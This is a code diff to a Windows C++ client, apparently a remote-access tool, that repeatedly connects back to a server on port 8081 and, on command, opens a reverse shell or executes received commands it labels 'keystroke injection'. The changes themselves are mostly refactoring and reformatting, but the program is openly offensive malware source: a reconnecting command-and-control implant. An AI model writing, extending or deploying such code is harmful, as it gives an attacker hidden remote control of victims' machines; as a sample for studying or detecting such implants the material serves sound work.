@@ -17,6 +17,8 @@ HANDLE hChildStdOutRead, hChildStdOutWrite;                                     
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 SOCKET sock;
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+void safe_closesocket(SOCKET& s);
+
 void send_data(SOCKET clientSocket, const string &data);
 int receive_data_int(SOCKET clientSocket);
 string receive_data(SOCKET clientSocket);
@@ -25,14 +27,6 @@ bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
 void rev_shell(SOCKET clientSocket);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-void safe_closesocket(SOCKET& s) {
-    if (s != INVALID_SOCKET) {
-        shutdown(s, SD_BOTH);
-        closesocket(s);
-        s = INVALID_SOCKET;
-    }
-}
 
 int main()
 {
@@ -43,7 +37,6 @@ int main()
     {
         bool connected = false;
 
-        // Initialize Winsock
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         {
@@ -61,7 +54,7 @@ int main()
 
         sockaddr_in serverAddr;
         serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(8081); // Port for input socket
+        serverAddr.sin_port = htons(8081);
         serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
         connected = false;
@@ -70,16 +63,13 @@ int main()
             if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
             {
                 int error = WSAGetLastError();
-
                 if (error != WSAECONNREFUSED)
                 {
                     std::stringstream ss;
                     ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                     std::cerr << ss.str();
-                } else
-                {
-                    std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-                }
+                } 
+                else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
                 Sleep(2000);
             }
             else
@@ -94,38 +84,42 @@ int main()
         while(loop)
         {
             int received = receive_data_int(sock);
-            if (received == 0 && WSAGetLastError() != 0) { // Check for recv errors other than graceful disconnect
+            if (received == 0 && WSAGetLastError() != 0)
+            {
                 std::cerr << "Receive error, disconnecting.\n";
                 loop = false;
                 connected = false;
-                break; // Exit inner loop to reconnect
+                
+                break;                                                                                      // Exit inner loop to reconnect
             }
 
             switch (received)
             {
-                case 2:                                                                                         //rev shell
+                case 2:                                                                                     //rev shell
                 {
                     rev_shell(sock);
                     break;
                 }
 
-                case 3:                                                                                         //keystroke injection
+                case 3:                                                                                     //keystroke injection
                 {                
                     ExecuteCommand(receive_data(sock));
                     break;
                 }
 
-                case 99:                                                                                        //dc from server
+                case 99:                                                                                    //dc from server
                 {
                     std::cout << "Server initiated disconnect.\n";
                     loop = false;
-                    connected = false; // Crucial: Reset connected flag here
+                    connected = false;
+                    
                     break;
                 }
-                case 11:                                                                                        //end all
+                case 11:                                                                                    //end all
                 {
                     loop = false;
                     outerloop = false;
+                    
                     break;
                 }
                 default:
@@ -138,15 +132,13 @@ int main()
         safe_closesocket(sock);
         WSACleanup();
 
-        if (outerloop && !connected) {
-            std::cout << "Waiting to reconnect...\n";
+        if (outerloop && !connected)
+        {
+            cout << "Waiting 5 sec to reconnect...\n";
             Sleep(5000);
         }
 
     }
-
-
-    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     return 0;
 }
@@ -342,4 +334,15 @@ void rev_shell(SOCKET clientSocket)
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);    
 
+}
+
+void safe_closesocket(SOCKET& s)
+{
+    if (s != INVALID_SOCKET)
+    {
+        shutdown(s, SD_BOTH);
+        closesocket(s);
+        
+        s = INVALID_SOCKET;
+    }
 }
